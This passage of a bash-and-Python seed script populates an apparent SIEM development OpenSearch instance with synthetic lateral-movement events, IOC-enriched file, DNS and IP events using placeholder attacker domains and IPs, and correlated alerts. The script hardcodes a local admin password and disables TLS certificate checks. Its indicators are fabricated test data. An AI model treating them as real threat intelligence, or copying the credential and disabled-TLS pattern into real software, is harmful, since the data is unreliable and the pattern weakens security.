                "protocol": "http"
            },
            "http": {
                "request": {"method": "GET"}
            },
            "url": {"full": url},
            "process": {"name": proc_name, "pid": proc_pid},
            "host": {"name": host_name,
                     "os": {"family": "linux" if is_linux else "windows"}},
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }

        # Add reputation for external IPs (Task 2.11)
        rep = get_reputation(dest_ip)
        if rep:
            http_event["threat"] = {"indicator": {"ip_reputation": rep}}

        events.append(http_event)

    # ─── Phase 3: SSH lateral connections (Task 2.5) ──────────────────────
    for i in range(ssh_count):
        current_time += timedelta(seconds=random.uniform(5.0, 30.0))
        ts = current_time.strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        # SSH lateral: internal to internal (Task 2.5)
        lateral_dst = random.choice([ip for ip in LATERAL_TARGETS if ip != src_ip])
        proc_name, proc_pid = random.choice(processes)
        ephemeral_port = random.randint(49152, 65535)

        ssh_event = {
            "@timestamp": ts,
            "event": {
                "action": "connection_established",
                "category": ["network"],
                "kind": "event",
                "type": ["connection"]
            },
            "source": {"ip": src_ip, "port": ephemeral_port},
            "destination": {"ip": lateral_dst, "port": 22},
            "network": {
                "bytes": random.randint(512, 8192),
                "direction": "lateral",
                "transport": "tcp",
                "protocol": "ssh"
            },
            "process": {"name": proc_name, "pid": proc_pid},
            "host": {"name": host_name,
                     "os": {"family": "linux" if is_linux else "windows"}},
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }
        events.append(ssh_event)

    # ─── Phase 3b: SMB lateral connections (Task 2.6) ─────────────────────
    for i in range(smb_count):
        current_time += timedelta(seconds=random.uniform(3.0, 20.0))
        ts = current_time.strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        # SMB lateral: internal to internal (Task 2.6)
        lateral_dst = random.choice([ip for ip in LATERAL_TARGETS if ip != src_ip])
        proc_name, proc_pid = random.choice(processes)
        ephemeral_port = random.randint(49152, 65535)

        smb_event = {
            "@timestamp": ts,
            "event": {
                "action": "connection_established",
                "category": ["network"],
                "kind": "event",
                "type": ["connection"]
            },
            "source": {"ip": src_ip, "port": ephemeral_port},
            "destination": {"ip": lateral_dst, "port": 445},
            "network": {
                "bytes": random.randint(4096, 32000),
                "direction": "lateral",
                "transport": "tcp",
                "protocol": "smb"
            },
            "process": {"name": proc_name, "pid": proc_pid},
            "host": {"name": host_name,
                     "os": {"family": "linux" if is_linux else "windows"}},
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }
        events.append(smb_event)

    return events

# ─── Generate NDJSON output for all alerts ───────────────────────────────────
total_events = 0
for alert in alerts:
    events = generate_network_events(alert)
    tenant_prefix = alert.get("tenantPrefix", "cwm")
    alert_id = alert["id"]

    for evt_idx, evt in enumerate(events):
        # Determine index date from event timestamp
        evt_ts = evt["@timestamp"]
        try:
            evt_date = datetime.strptime(evt_ts, "%Y-%m-%dT%H:%M:%S.%fZ")
            idx_date = evt_date.strftime("%Y.%m.%d")
        except ValueError:
            idx_date = TODAY_STR

        index_name = f"v3-hive-log-{tenant_prefix}-{idx_date}"
        doc_id = f"net-{alert_id}-{evt_idx:03d}"

        # Output NDJSON: action line + doc line
        print(json.dumps({"index": {"_index": index_name, "_id": doc_id}}))
        print(json.dumps(evt))
        total_events += 1

print(f"# Total network events generated: {total_events}", file=sys.stderr)
PYEOF

if [ ! -s "$NET_NDJSON_FILE" ]; then
  fail "Python network event generation produced no output"
  rm -f "$NET_NDJSON_FILE"
  exit 1
fi
success "Generated network activity events"

# ─── Bulk-insert network events into OpenSearch ──────────────────────────────

info "Indexing network activity events into OpenSearch..."

# Split into chunks of 500 lines (250 docs) for bulk API
split -l 500 "$NET_NDJSON_FILE" /tmp/ha_net_chunk_

NET_CHUNK_COUNT=0
for chunk_file in /tmp/ha_net_chunk_*; do
  NET_CHUNK_COUNT=$((NET_CHUNK_COUNT + 1))
  printf '%s\n' "$(cat "$chunk_file")" | ${CURL_OS} -X POST "${OS_URL}/_bulk" \
    -H "${CONTENT_TYPE_NDJSON}" \
    --data-binary @- 2>/dev/null | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    items = r.get('items', [])
    errors = r.get('errors', False)
    if errors:
        err_count = sum(1 for i in items if 'error' in i.get('index', i.get('create', {})))
        print(f'  Chunk: Indexed {len(items)} network events ({err_count} errors)')
    else:
        print(f'  Chunk: Indexed {len(items)} network events')
except:
    print('  Network event chunk insert completed')
"
  rm -f "$chunk_file"
done
success "Network events indexed (${NET_CHUNK_COUNT} chunks)"

# Cleanup temp file
rm -f "$NET_NDJSON_FILE"

echo ""

# ─── Task 2.14: Verify network events per alert ─────────────────────────────

info "Verifying network activity events..."

# Refresh indices so docs are searchable
${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_refresh" 2>/dev/null > /dev/null

# Verify a sample of alerts have 10-30 network events each
VERIFY_ALERTS=("INV-CWM-001" "INV-CWM-005" "INV-WORKMATES1-001" "INV-WORKMATES2-001")
NET_VERIFY_PASS=0
NET_VERIFY_FAIL=0

for VERIFY_ID in "${VERIFY_ALERTS[@]}"; do
  NET_COUNT=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_count" \
    -H "${CONTENT_TYPE}" \
    -d "{\"query\":{\"bool\":{\"must\":[{\"term\":{\"event.category.keyword\":\"network\"}},{\"term\":{\"alert.id.keyword\":\"${VERIFY_ID}\"}}]}}}" 2>/dev/null | \
    python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    print(r.get('count', 0))
except:
    print('0')
" 2>/dev/null)

  if [ "$NET_COUNT" -ge 10 ] && [ "$NET_COUNT" -le 30 ] 2>/dev/null; then
    NET_VERIFY_PASS=$((NET_VERIFY_PASS + 1))
  else
    NET_VERIFY_FAIL=$((NET_VERIFY_FAIL + 1))
    if [ "$NET_COUNT" -gt 0 ] 2>/dev/null; then
      warn "  ${VERIFY_ID}: ${NET_COUNT} network events (expected 10-30)"
    fi
  fi
done

if [ $NET_VERIFY_FAIL -eq 0 ]; then
  success "Network event verification passed: all ${NET_VERIFY_PASS} sampled alerts have 10-30 network events"
elif [ $NET_VERIFY_PASS -gt 0 ]; then
  warn "Network event verification: ${NET_VERIFY_PASS} passed, ${NET_VERIFY_FAIL} failed"
else
  warn "Network event verification: no events found (OpenSearch may not be running)"
fi

# Verify network events have required fields (Task 2.7) and protocol distribution
FIELD_CHECK=$(${CURL_OS} -X POST "${OS_URL}/v3-hive-log-*/_search" \
  -H "${CONTENT_TYPE}" \
  -d '{"query":{"bool":{"must":[{"term":{"event.category.keyword":"network"}},{"term":{"alert.id.keyword":"INV-CWM-001"}}]}},"size":30,"_source":["source.ip","source.port","destination.ip","destination.port","network.bytes","network.direction","network.transport","network.protocol","process.name","process.pid","host.name","@timestamp","dns.question.name","dns.resolved_ip","tls.client.ja3","tls.server_name","tls.version","tls.server.issuer","tls.server.subject","tls.server.not_after","threat.indicator.ip_reputation","alert.id","correlation.id","http.request.method","url.full"]}' 2>/dev/null)

echo "$FIELD_CHECK" | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    hits = r.get('hits', {}).get('hits', [])
    if not hits:
        print('  NO_HITS — skipping field verification')
        sys.exit(0)

    # Check protocol distribution
    protocols = {}
    has_dns = 0
    has_tls = 0
    has_http = 0
    has_reputation = 0
    field_errors = []

    for hit in hits:
        doc = hit['_source']
        proto = doc.get('network', {}).get('protocol', 'unknown')
        protocols[proto] = protocols.get(proto, 0) + 1

        # Check common required fields (Task 2.7)
        if not doc.get('source', {}).get('ip'):
            field_errors.append('missing source.ip')
        if not doc.get('source', {}).get('port'):
            field_errors.append('missing source.port')
        if not doc.get('destination', {}).get('ip'):
            field_errors.append('missing destination.ip')
        if not doc.get('destination', {}).get('port'):
            field_errors.append('missing destination.port')
        if doc.get('network', {}).get('bytes') is None:
            field_errors.append('missing network.bytes')
        if not doc.get('network', {}).get('direction'):
            field_errors.append('missing network.direction')
        if not doc.get('network', {}).get('transport'):
            field_errors.append('missing network.transport')
        if not doc.get('process', {}).get('name'):
            field_errors.append('missing process.name')
        if not doc.get('alert', {}).get('id'):
            field_errors.append('missing alert.id')
        if not doc.get('correlation', {}).get('id'):
            field_errors.append('missing correlation.id')

        # Check DNS fields (Task 2.2)
        if doc.get('dns', {}).get('question', {}).get('name'):
            has_dns += 1
        # Check TLS fields (Task 2.10)
        if doc.get('tls', {}).get('client', {}).get('ja3'):
            has_tls += 1
        # Check HTTP fields (Task 2.4)
        if doc.get('http', {}).get('request', {}).get('method'):
            has_http += 1
        # Check reputation (Task 2.11)
        if doc.get('threat', {}).get('indicator', {}).get('ip_reputation'):
            has_reputation += 1

    # Report results
    if field_errors:
        unique_errors = list(set(field_errors))[:5]
        print(f'  Field issues: {unique_errors}')
    else:
        print(f'  All required fields present on {len(hits)} events')

    print(f'  Protocol distribution: {protocols}')
    print(f'  DNS events: {has_dns}, TLS events: {has_tls}, HTTP events: {has_http}')
    print(f'  Events with reputation: {has_reputation}')
except Exception as e:
    print(f'  Field verification error: {e}')
" 2>/dev/null

echo ""

# ─── IOC & Related Alert Generation (Tasks 3.1-3.10) ────────────────────────
# Part A: IOC-enriched file hash events with threat.indicator fields
# Part B: Related alerts in v3-hive-alert-* with correlation dimensions

info "Generating IOC-enriched events and related alert chains..."

IOC_NDJSON_FILE=$(mktemp /tmp/ha_ioc_events_XXXXXX)

python3 << 'PYEOF' > "$IOC_NDJSON_FILE"
import json, random, sys
from datetime import datetime, timedelta, timezone
import urllib.request, ssl, base64

random.seed(2026)  # Reproducible IOC seed data

NOW = datetime.now(timezone.utc)
TODAY_STR = NOW.strftime("%Y.%m.%d")

# ─── OpenSearch connection ────────────────────────────────────────────────────
OS_URL = "https://localhost:9200"
OS_USER = "admin"
OS_PASS = "LocalDev@2024!"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def os_query(index_pattern, query_body):
    """Query OpenSearch and return hits."""
    url = f"{OS_URL}/{index_pattern}/_search"
    data = json.dumps(query_body).encode()
    creds = base64.b64encode(f"{OS_USER}:{OS_PASS}".encode()).decode()
    req = urllib.request.Request(url, data=data, method="POST")
    req.add_header("Content-Type", "application/json")
    req.add_header("Authorization", f"Basic {creds}")
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return json.loads(resp.read())
    except Exception as e:
        print(f"# ERROR querying OpenSearch: {e}", file=sys.stderr)
        return {"hits": {"hits": [], "total": {"value": 0}}}

# ─── IOC Data (Tasks 3.3, 3.4, 3.5) ─────────────────────────────────────────

# SHA-256 hashes — realistic 64-char hex strings (Task 3.3)
SHA256_HASHES = [
    "a1b2c3d4e5f67890abcdef1234567890abcdef1234567890abcdef1234567890",
    "7f8e9d0c1b2a3456789012345678901234567890123456789012345678901234",
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592",
    "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
    "5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8",
    "2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824",
    "b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9",
    "4e07408562bedb8b60ce05c1decfe3ad16b72230967de01f640b7e4729b49fce",
    "6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b",
]

# Malicious domains (Task 3.4) — same as network section for consistency
MALICIOUS_DOMAINS = [
    "c2.evil.example.com",
    "drop.malware-cdn.example.net",
    "exfil.darkweb.example.org",
    "staging.apt-tools.example.com",
    "beacon.cobaltstrike.example.net",
]

# Malicious IPs (Task 3.5)
MALICIOUS_IPS = [
    ("203.0.113.45", "C2 server"),
    ("203.0.113.88", "known scanner"),
    ("198.51.100.22", "malware CDN"),
    ("198.51.100.177", "exfil endpoint"),
]

# Threat indicator enrichment data (Task 3.2)
TI_PROVIDERS = ["VirusTotal", "AbuseIPDB", "MISP", "HiveArmor TI"]
TLP_VALUES = ["WHITE", "GREEN", "AMBER", "RED"]

# Domain-to-IP map (reuse from network section)
DOMAIN_IP_MAP = {
    "c2.evil.example.com": "203.0.113.45",
    "drop.malware-cdn.example.net": "198.51.100.22",
    "exfil.darkweb.example.org": "198.51.100.177",
    "staging.apt-tools.example.com": "203.0.113.200",
    "beacon.cobaltstrike.example.net": "203.0.113.112",
}

# Hosts matching Sprint 39 seed
WINDOWS_HOSTS = ["FIN-WKS-044", "DC-PROD-01", "HR-LPT-012", "MKT-DSK-019",
                 "DEV-WKS-007", "OPS-NAS-03"]
LINUX_HOSTS = ["ENG-SRV-08", "SEC-MON-02"]

USERNAMES = ["sarah.chen", "james.wilson", "admin-svc-01", "priya.sharma",
             "carlos.mendez", "backup-agent", "svc-monitor", "root"]

# ─── Fetch INV-* alerts from OpenSearch ───────────────────────────────────────
alert_query = {
    "query": {"wildcard": {"id.keyword": {"value": "INV-*"}}},
    "size": 100,
    "_source": ["id", "correlationId", "primaryEntityId", "primaryEntityLabel",
                "tenantPrefix", "ruleId", "ruleName", "@timestamp"]
}
result = os_query("v3-hive-alert-*", alert_query)
alerts = [hit["_source"] for hit in result["hits"]["hits"]]

if not alerts:
    print("# WARNING: No INV-* alerts found. Generating from known IDs.",
          file=sys.stderr)
    tenants = [
        ("cwm", "CWM", 20),
        ("wm1", "WORKMATES1", 15),
        ("wm2", "WORKMATES2", 15)
    ]
    for prefix, label, count in tenants:
        for i in range(1, count + 1):
            alert_id = f"INV-{label}-{i:03d}"
            host = WINDOWS_HOSTS[i % len(WINDOWS_HOSTS)] if i % 5 != 0 \
                else LINUX_HOSTS[i % len(LINUX_HOSTS)]
            alerts.append({
                "id": alert_id,
                "correlationId": f"corr-{prefix}-session-{(i-1)//5 + 1}",
                "primaryEntityId": f"entity-{host}",
                "primaryEntityLabel": host,
                "tenantPrefix": prefix,
                "ruleId": f"rule-{(i % 5) + 1}",
                "ruleName": f"Detection Rule {(i % 5) + 1}",
                "@timestamp": (NOW - timedelta(hours=random.uniform(1, 72))
                              ).strftime("%Y-%m-%dT%H:%M:%S.000Z")
            })

print(f"# Found {len(alerts)} INV-* alerts for IOC enrichment", file=sys.stderr)

# ─── Part A: IOC Enrichment Event Generation (Tasks 3.1-3.5) ─────────────────

def generate_ioc_events(alert):
    """Generate file-category events with SHA-256 hashes and threat.indicator
    enrichment. Also adds threat.indicator enrichment records for domains/IPs.

    Tasks fulfilled:
      3.1 - 3-10 unique IOC values per alert across file.hash.sha256,
            dns.question.name, destination.ip
      3.2 - threat.indicator enrichment on IOC-bearing events
      3.3 - Realistic 64-char hex SHA-256 hashes
      3.4 - Malicious domains from specified list
      3.5 - Malicious IPs from specified list
    """
    alert_id = alert["id"]
    correlation_id = alert.get("correlationId", f"corr-{alert_id}")
    host_name = alert.get("primaryEntityLabel", "FIN-WKS-044")
    tenant_prefix = alert.get("tenantPrefix", "cwm")
    alert_ts_str = alert.get("@timestamp",
                             NOW.strftime("%Y-%m-%dT%H:%M:%S.000Z"))

    try:
        base_time = datetime.strptime(alert_ts_str, "%Y-%m-%dT%H:%M:%S.%fZ")
        base_time = base_time.replace(tzinfo=timezone.utc)
    except ValueError:
        base_time = NOW - timedelta(hours=random.uniform(1, 48))

    is_linux = host_name in LINUX_HOSTS

    # Determine IOC count: 3-10 unique values (Task 3.1)
    # Mix of: 2-4 SHA-256 hashes, 1-3 domains, 1-3 IPs
    num_hashes = random.randint(2, 4)
    num_domains = random.randint(1, 3)
    num_ips = random.randint(1, 3)

    # Select IOC values deterministically per alert
    alert_hash = hash(alert_id)
    selected_hashes = random.sample(SHA256_HASHES, num_hashes)
    selected_domains = random.sample(MALICIOUS_DOMAINS, num_domains)
    selected_ips = random.sample(MALICIOUS_IPS, num_ips)

    events = []
    current_time = base_time - timedelta(minutes=random.randint(3, 8))

    # ─── File hash events (SHA-256 with threat.indicator) ─────────────────
    file_names = [
        "payload.dll", "svchost.exe", "updater.vbs", "beacon.exe",
        "loader.bin", "stage.exe", "cred.dll", "exploit.elf",
        "stager.ps1", "config.dat"
    ]

    for i, sha256 in enumerate(selected_hashes):
        current_time += timedelta(seconds=random.uniform(2.0, 10.0))
        ts = current_time.strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        file_name = file_names[i % len(file_names)]
        if is_linux:
            file_path = f"/tmp/{file_name}" if random.random() < 0.5 \
                else f"/dev/shm/{file_name}"
        else:
            file_path = f"C:\\Users\\Public\\Documents\\{file_name}" \
                if random.random() < 0.5 \
                else f"C:\\Windows\\Temp\\{file_name}"

        # threat.indicator enrichment (Task 3.2)
        confidence = random.randint(50, 99)
        provider = random.choice(TI_PROVIDERS)
        tlp = random.choice(TLP_VALUES)

        file_event = {
            "@timestamp": ts,
            "event": {
                "action": "file_created",
                "category": ["file"],
                "kind": "event",
                "type": ["creation"]
            },
            "file": {
                "name": file_name,
                "path": file_path,
                "hash": {"sha256": sha256}
            },
            "threat": {
                "indicator": {
                    "type": "sha256",
                    "confidence": confidence,
                    "provider": provider,
                    "marking": {"tlp": tlp}
                }
            },
            "process": {
                "name": "powershell.exe" if not is_linux else "python3",
                "pid": random.randint(1000, 65000) if not is_linux \
                    else random.randint(100, 32000)
            },
            "user": {"name": random.choice(USERNAMES)},
            "host": {
                "name": host_name,
                "os": {"family": "linux" if is_linux else "windows"}
            },
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }
        events.append(file_event)

    # ─── Domain IOC events (dns with threat.indicator) ────────────────────
    for domain in selected_domains:
        current_time += timedelta(seconds=random.uniform(1.0, 5.0))
        ts = current_time.strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        resolved_ip = DOMAIN_IP_MAP.get(domain, "203.0.113.200")
        confidence = random.randint(60, 99)
        provider = random.choice(TI_PROVIDERS)
        tlp = random.choice(["AMBER", "RED"])

        domain_event = {
            "@timestamp": ts,
            "event": {
                "action": "dns_query",
                "category": ["network"],
                "kind": "event",
                "type": ["connection", "protocol"]
            },
            "dns": {
                "question": {"name": domain, "type": "A"},
                "resolved_ip": [resolved_ip]
            },
            "source": {"ip": "10.1.5.44", "port": random.randint(49152, 65535)},
            "destination": {"ip": "10.1.5.1", "port": 53},
            "network": {
                "bytes": random.randint(64, 256),
                "direction": "outbound",
                "transport": "udp",
                "protocol": "dns"
            },
            "threat": {
                "indicator": {
                    "type": "domain",
                    "confidence": confidence,
                    "provider": provider,
                    "marking": {"tlp": tlp}
                }
            },
            "process": {
                "name": "svchost.exe" if not is_linux else "curl",
                "pid": random.randint(1000, 65000) if not is_linux \
                    else random.randint(100, 32000)
            },
            "host": {
                "name": host_name,
                "os": {"family": "linux" if is_linux else "windows"}
            },
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }
        events.append(domain_event)

    # ─── IP IOC events (external IPs with threat.indicator) ───────────────
    for ip_tuple in selected_ips:
        ip_addr, ip_desc = ip_tuple
        current_time += timedelta(seconds=random.uniform(1.0, 5.0))
        ts = current_time.strftime("%Y-%m-%dT%H:%M:%S.") + \
             f"{random.randint(0, 999):03d}Z"

        confidence = random.randint(70, 99)
        provider = random.choice(TI_PROVIDERS)
        tlp = "RED" if "C2" in ip_desc else random.choice(["AMBER", "RED"])

        ip_event = {
            "@timestamp": ts,
            "event": {
                "action": "connection_established",
                "category": ["network"],
                "kind": "event",
                "type": ["connection"]
            },
            "source": {"ip": "10.1.5.44", "port": random.randint(49152, 65535)},
            "destination": {"ip": ip_addr, "port": 443},
            "network": {
                "bytes": random.randint(2048, 50000),
                "direction": "outbound",
                "transport": "tcp",
                "protocol": "tls"
            },
            "threat": {
                "indicator": {
                    "type": "ipv4",
                    "confidence": confidence,
                    "provider": provider,
                    "marking": {"tlp": tlp}
                }
            },
            "process": {
                "name": "rundll32.exe" if not is_linux else "beacon",
                "pid": random.randint(1000, 65000) if not is_linux \
                    else random.randint(100, 32000)
            },
            "host": {
                "name": host_name,
                "os": {"family": "linux" if is_linux else "windows"}
            },
            "alert": {"id": alert_id},
            "correlation": {"id": correlation_id}
        }
        events.append(ip_event)

    return events

# ─── Generate IOC NDJSON output for all alerts ───────────────────────────────
total_ioc_events = 0
for alert in alerts:
    events = generate_ioc_events(alert)
    tenant_prefix = alert.get("tenantPrefix", "cwm")
    alert_id = alert["id"]

    for evt_idx, evt in enumerate(events):
        evt_ts = evt["@timestamp"]
        try:
            evt_date = datetime.strptime(evt_ts, "%Y-%m-%dT%H:%M:%S.%fZ")
            idx_date = evt_date.strftime("%Y.%m.%d")
        except ValueError:
            idx_date = TODAY_STR

        index_name = f"v3-hive-log-{tenant_prefix}-{idx_date}"
        doc_id = f"ioc-{alert_id}-{evt_idx:03d}"

        print(json.dumps({"index": {"_index": index_name, "_id": doc_id}}))
        print(json.dumps(evt))
        total_ioc_events += 1

print(f"# Total IOC-enriched events generated: {total_ioc_events}",
      file=sys.stderr)

# ─── Part B: Related Alert Generation (Tasks 3.6-3.10) ───────────────────────
# For the first 10 INV-* alerts (one per scenario), create 2-5 related alerts
# that share correlation dimensions:
#   - shared_entity: same primaryEntityId
#   - shared_session: same correlationId
#   - process_ancestry: overlapping process PIDs
#   - rule_correlation: same ruleId within 24h

# Related alert title templates
RELATED_TITLES = [
    "Suspicious PowerShell execution detected",
    "Outbound C2 traffic to known malicious IP",
    "Credential dumping attempt via LSASS",
    "Lateral movement via SMB detected",
    "Malicious file download from external host",
    "Encoded command execution observed",
    "Registry persistence mechanism created",
    "Scheduled task created for persistence",
    "DNS query to known C2 domain",
    "Brute force login attempts detected",
    "Data exfiltration to external endpoint",
    "Privilege escalation attempt",
    "Suspicious DLL side-loading detected",
    "WMI remote execution detected",
    "Anomalous network beaconing pattern",
]

SEVERITIES = ["low", "medium", "high", "critical"]
RULE_NAMES = [
    "Encoded PowerShell Execution",
    "Known C2 Domain Resolution",
    "LSASS Memory Access",
    "Lateral SMB Movement",
    "Malware File Download",
    "Suspicious Scheduled Task",
    "Registry Run Key Modification",
    "Beacon Interval Detection",
    "Credential Theft Activity",
    "Data Exfiltration Pattern",
]

# Select 10 scenarios (first 10 alerts, or as many as available)
scenario_alerts = alerts[:10]
print(f"# Creating related alerts for {len(scenario_alerts)} scenarios",
      file=sys.stderr)

# Track related alerts generated (for NDJSON output)
related_alert_docs = []

for scenario_idx, inv_alert in enumerate(scenario_alerts):
    inv_id = inv_alert["id"]
    inv_correlation_id = inv_alert.get("correlationId", f"corr-{inv_id}")
    inv_entity_id = inv_alert.get("primaryEntityId", f"entity-{inv_alert.get('primaryEntityLabel', 'FIN-WKS-044')}")
    inv_entity_label = inv_alert.get("primaryEntityLabel", "FIN-WKS-044")
    inv_rule_id = inv_alert.get("ruleId", f"rule-{(scenario_idx % 5) + 1}")
    inv_rule_name = inv_alert.get("ruleName", RULE_NAMES[scenario_idx % len(RULE_NAMES)])
    tenant_prefix = inv_alert.get("tenantPrefix", "cwm")
    inv_ts_str = inv_alert.get("@timestamp", NOW.strftime("%Y-%m-%dT%H:%M:%S.000Z"))

    try:
        inv_time = datetime.strptime(inv_ts_str, "%Y-%m-%dT%H:%M:%S.%fZ")
        inv_time = inv_time.replace(tzinfo=timezone.utc)
    except ValueError:
        inv_time = NOW - timedelta(hours=random.uniform(1, 48))

    # Decide how many related alerts: 2-5 (Task 3.6)
    num_related = random.randint(2, 5)

    # Ensure at least 2 correlation types (Task 3.8)
    # Assign correlation types to related alerts
    # Available: shared_entity, shared_session, process_ancestry, rule_correlation
    correlation_types = ["shared_entity", "shared_session",
                         "process_ancestry", "rule_correlation"]

    # First two related alerts MUST use different correlation types
    # Remaining can be any type
    assigned_types = random.sample(correlation_types, min(2, len(correlation_types)))
    while len(assigned_types) < num_related:
        assigned_types.append(random.choice(correlation_types))
    random.shuffle(assigned_types)

    # Generate PIDs for process_ancestry correlation
    base_pid = random.randint(2000, 10000)
    shared_pids = [base_pid, base_pid + random.randint(100, 500),
                   base_pid + random.randint(600, 1200)]

    for rel_idx in range(num_related):
        rel_alert_id = f"REL-{inv_id}-{rel_idx + 1:02d}"
        corr_type = assigned_types[rel_idx]

        # Distinct timestamp (Task 3.7) — within 24h of parent alert
        time_offset = timedelta(
            hours=random.uniform(0.5, 12),
            minutes=random.randint(0, 59)
        )
        if random.random() < 0.5:
            rel_time = inv_time - time_offset
        else:
            rel_time = inv_time + time_offset

        rel_ts = rel_time.strftime("%Y-%m-%dT%H:%M:%S.000Z")

        # Distinct title, severity, riskScore (Task 3.7)
        rel_title = RELATED_TITLES[(scenario_idx * 5 + rel_idx) % len(RELATED_TITLES)]
        rel_severity = SEVERITIES[random.randint(0, 3)]
        rel_risk_score = random.randint(30, 95)

        # Build the related alert based on correlation type
        rel_entity_id = inv_entity_id  # default
        rel_entity_label = inv_entity_label
        rel_correlation_id = f"corr-rel-{rel_alert_id}"  # default different
        rel_rule_id = f"rule-rel-{rel_idx}"  # default different
        rel_rule_name = RULE_NAMES[(scenario_idx + rel_idx + 1) % len(RULE_NAMES)]
        rel_pids = [random.randint(3000, 60000)]  # default random

        if corr_type == "shared_entity":
            # Same primaryEntityId as parent alert
            rel_entity_id = inv_entity_id
            rel_entity_label = inv_entity_label
            # Different correlation/rule
            rel_correlation_id = f"corr-entity-{rel_alert_id}"
            rel_rule_id = f"rule-entity-{scenario_idx}-{rel_idx}"

        elif corr_type == "shared_session":
            # Same correlationId as parent alert
            rel_correlation_id = inv_correlation_id
            # May have different entity
            if random.random() < 0.5:
                rel_entity_id = f"entity-{random.choice(WINDOWS_HOSTS)}"
                rel_entity_label = rel_entity_id.replace("entity-", "")
            rel_rule_id = f"rule-session-{scenario_idx}-{rel_idx}"

        elif corr_type == "process_ancestry":
            # Overlapping process PIDs
            rel_pids = shared_pids[:2]
            # Same entity (processes on same host)
            rel_entity_id = inv_entity_id
            rel_entity_label = inv_entity_label
            rel_correlation_id = f"corr-proc-{rel_alert_id}"
            rel_rule_id = f"rule-proc-{scenario_idx}-{rel_idx}"

        elif corr_type == "rule_correlation":
            # Same ruleId within 24h
            rel_rule_id = inv_rule_id
            rel_rule_name = inv_rule_name
            # Different entity (same rule fired on different host)
            other_host = random.choice(
                [h for h in WINDOWS_HOSTS if h != inv_entity_label]
            )
            rel_entity_id = f"entity-{other_host}"
            rel_entity_label = other_host
            rel_correlation_id = f"corr-rule-{rel_alert_id}"

        # statusHistory with at least creation entry (Task 3.9)
        status_history = [
            {
                "status": "new",
                "timestamp": rel_ts,
                "user": "system",
                "comment": "Alert created by correlation engine"
            }
        ]
        # Some related alerts have additional status transitions
        if random.random() < 0.4:
            ack_time = (rel_time + timedelta(minutes=random.randint(5, 60))
                       ).strftime("%Y-%m-%dT%H:%M:%S.000Z")
            status_history.append({
                "status": "acknowledged",
                "timestamp": ack_time,
                "user": random.choice(USERNAMES[:5]),
                "comment": "Acknowledged for investigation"
            })

        # Build the complete related alert document (Task 3.9)
        rel_alert_doc = {
            "id": rel_alert_id,
            "title": rel_title,
            "severity": rel_severity,
            "riskScore": rel_risk_score,
            "status": status_history[-1]["status"],
            "primaryEntityId": rel_entity_id,
            "primaryEntityLabel": rel_entity_label,
            "correlationId": rel_correlation_id,
            "ruleId": rel_rule_id,
            "ruleName": rel_rule_name,
            "processPids": rel_pids,
            "statusHistory": status_history,
            "@timestamp": rel_ts,
            "tenantPrefix": tenant_prefix,
            "event": {
                "kind": "alert",
                "category": ["intrusion_detection"]
            }
        }
        related_alert_docs.append((rel_alert_doc, tenant_prefix))

# ─── Output related alert NDJSON ─────────────────────────────────────────────
total_related = 0
for rel_doc, t_prefix in related_alert_docs:
    rel_ts = rel_doc["@timestamp"]
    try:
        rel_date = datetime.strptime(rel_ts, "%Y-%m-%dT%H:%M:%S.%fZ")
        idx_date = rel_date.strftime("%Y.%m.%d")
    except ValueError:
        idx_date = TODAY_STR

    index_name = f"v3-hive-alert-{t_prefix}-{idx_date}"
    doc_id = rel_doc["id"]

    print(json.dumps({"index": {"_index": index_name, "_id": doc_id}}))
    print(json.dumps(rel_doc))
    total_related += 1

print(f"# Total related alerts generated: {total_related}", file=sys.stderr)
print(f"# Grand total docs in this NDJSON: {total_ioc_events + total_related}",
      file=sys.stderr)
PYEOF

if [ ! -s "$IOC_NDJSON_FILE" ]; then
  fail "Python IOC/related-alert generation produced no output"
  rm -f "$IOC_NDJSON_FILE"
  exit 1
fi
success "Generated IOC-enriched events and related alert chains"

# ─── Bulk-insert IOC events and related alerts into OpenSearch ────────────────

info "Indexing IOC events and related alerts into OpenSearch..."

# Split into chunks of 500 lines (250 docs) for bulk API
split -l 500 "$IOC_NDJSON_FILE" /tmp/ha_ioc_chunk_

IOC_CHUNK_COUNT=0
for chunk_file in /tmp/ha_ioc_chunk_*; do
  IOC_CHUNK_COUNT=$((IOC_CHUNK_COUNT + 1))
  printf '%s\n' "$(cat "$chunk_file")" | ${CURL_OS} -X POST "${OS_URL}/_bulk" \
    -H "${CONTENT_TYPE_NDJSON}" \
    --data-binary @- 2>/dev/null | python3 -c "
import sys, json
try:
    r = json.load(sys.stdin)
    items = r.get('items', [])
    errors = r.get('errors', False)
    if errors:
        err_count = sum(1 for i in items if 'error' in i.get('index', i.get('create', {})))
        print(f'  Chunk: Indexed {len(items)} IOC/related docs ({err_count} errors)')
    else:
        print(f'  Chunk: Indexed {len(items)} IOC/related docs')
except:
    print('  IOC/related alert chunk insert completed')
"
  rm -f "$chunk_file"
done
